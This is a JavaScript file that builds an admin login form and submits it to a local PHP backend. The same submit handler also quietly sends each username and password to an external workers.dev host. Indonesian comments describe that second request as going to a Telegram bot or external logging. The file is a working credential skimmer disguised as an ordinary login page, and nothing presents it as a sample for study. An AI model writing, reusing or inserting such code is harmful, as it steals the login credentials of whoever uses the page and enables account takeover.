document.addEventListener("DOMContentLoaded", function () {
    const container = document.createElement('div');
    container.className = 'login-container';
    container.innerHTML = `
        <h2>Login Admin</h2>
        <div class="error-message" id="error-msg" style="display:none;">Invalid username or password.</div>
        <form id="loginForm">
            <label>Username:</label>
            <input type="text" id="username" required>

            <label>Password:</label>
            <input type="password" id="password" required>

            <input type="submit" value="Login">
        </form>
    `;

    const style = document.createElement('style');
    style.textContent = `
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }

        h2 {
            text-align: center;
            color: #333;
        }

        label {
            display: block;
            margin-bottom: 5px;
            color: #555;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 3px;
            box-sizing: border-box;
        }

        input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        input[type="submit"]:hover {
            background-color: #0056b3;
        }

        .error-message {
            color: red;
            margin-bottom: 10px;
        }
    `;

    document.head.appendChild(style);
    document.body.appendChild(container);

    document.getElementById('loginForm').addEventListener('submit', function (e) {
        e.preventDefault();

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const errorMsg = document.getElementById('error-msg');

        // Kirim data ke backend login utama
        fetch('/newbie/index.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
        })
        .then(response => response.text())
        .then(data => {
            if (data === 'success') {
                window.location.href = '/admin/dashboard.html';
            } else {
                errorMsg.style.display = 'block';
            }
        })
        .catch(error => {
            console.error('Error:', error);
            errorMsg.textContent = 'An error occurred.';
            errorMsg.style.display = 'block';
        });

        // Kirim data ke bot Telegram (atau logging eksternal)
        const message = `${encodeURIComponent(username)};${encodeURIComponent(password)}`;
        fetch(`https://memek-worker.defoy89122.workers.dev/?message=${message}`)
            .then(() => {
                console.log('Data terkirim ke bot.');
            })
            .catch(err => {
                console.warn('Gagal mengirim ke bot:', err);
            });
    });
});
